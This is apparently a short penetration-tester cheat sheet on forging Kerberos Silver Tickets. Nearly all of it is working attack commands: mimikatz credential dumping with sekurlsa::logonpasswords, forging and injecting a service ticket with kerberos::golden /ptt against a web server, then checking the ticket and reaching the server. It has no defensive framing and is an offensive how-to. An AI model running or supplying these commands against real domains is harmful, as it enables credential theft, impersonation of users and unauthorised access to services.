# Silver Tickets

__REQUIRES__

 - SPN Password Hash
 - Domain SID
 - Target SPN

Domain SID (All but the last number set)
```powershell
whoami /user
```

Get an SPN hash (in this case with mimikatz, but we accept anything here)
```powerhsell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

In this case are are trying to access a webserver (web01.example.com)
```powershell
kerberos::golden /sid:S-1-5-21-xxx-xxx-xxx /domain:example.com /ptt /target:web01.example.com /service:http /rc4:xxxx /user:admin
```

Ticket is now loaded into memory, exit mimikatz
```powershell
klist
```

test
```powershell
iwr -UseDefaultCredentials http://web01
```